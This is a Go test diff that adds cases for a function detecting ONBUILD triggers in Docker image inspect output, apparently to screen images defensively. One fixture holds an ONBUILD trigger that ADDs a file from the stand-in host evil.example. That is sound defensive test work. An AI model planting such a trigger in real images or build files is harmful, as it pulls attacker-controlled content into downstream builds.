@@ -45,3 +45,29 @@ func TestRunRefusesImageVolumes(t *testing.T) {
 		})
 	}
 }
+
+// dockerInspectOnBuild is the shape of `docker image inspect` for an image
+// built with an ONBUILD trigger (trimmed).
+const dockerInspectOnBuild = `[{"Id":"sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef","RepoTags":["onbuild.example/base:1"],"Config":{"Env":["PATH=/bin"],"Cmd":["sh"],"OnBuild":["ADD https://evil.example/x /x"],"Labels":null}}]`
+
+func TestHasOnBuild(t *testing.T) {
+	tests := map[string]struct {
+		inspect string
+		want    bool
+	}{
+		"docker trigger":  {dockerInspectOnBuild, true},
+		"nested other":    {`[{"Id":"x","ContainerConfig":{"onbuild":["RUN true"]}}]`, true},
+		"docker none":     {`[{"Id":"x","Config":{"OnBuild":null}}]`, false},
+		"docker empty":    {`[{"Id":"x","Config":{"OnBuild":[]}}]`, false},
+		"podman no field": {`[{"Id":"x","Config":{"Env":["A=1"]},"Labels":{"OnBuild":"text"}}]`, false},
+		"null":            {"null\n", false},
+		"not JSON":        {"Error: no such image", true},
+	}
+	for name, tt := range tests {
+		t.Run(name, func(t *testing.T) {
+			if got := hasOnBuild([]byte(tt.inspect)); got != tt.want {
+				t.Errorf("hasOnBuild = %v, want %v", got, tt.want)
+			}
+		})
+	}
+}
